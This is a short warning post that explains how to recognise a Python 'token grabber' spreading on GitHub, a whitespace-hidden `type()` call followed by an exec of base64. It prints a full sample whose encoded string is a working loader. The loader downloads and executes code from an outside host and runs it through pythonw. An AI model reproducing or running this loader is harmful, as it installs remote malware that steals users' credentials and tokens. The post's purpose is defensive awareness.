Please stop downloading shit fake tools (aka grabber/dualhooked) for example on youtube ones, when you download a script please read it, check the dependency and download from trusted people.

Github has always been a healthy place to get all kinds of software and scripts created by our wonderful community of enthusiasts,
but there are still many children near puberty who have fun posting viruses (not_a_virus.exe).
In this case it is very easy to see the deception.

# New token grabber going arround on github

There is a new token grabber going around on github, its very sad to see this type of shit on github

How does it work?

if the code is in python and you see the `type` function being called and theres some random string inside the params of the function then its very likely that its a rat, if you scroll to the right side of the `type` function you will see that 'builtins' is being imported using the `__import__` method, and 'base64' is also imported to decode a string that contains the rat

Example:

![](https://hi.shahzain.me/r/snap_52170360.png)

![](https://hi.shahzain.me/r/snap_ecf3c73c.png)

How does the code look?

```python
type('Downloading modules...')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vd2FzcC5wbGFndWUuZnVuL2luamVjdC9GcFFxTkhyc2NIQ1VPQnhrJykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))
```

If you see something like this avoid downloading it
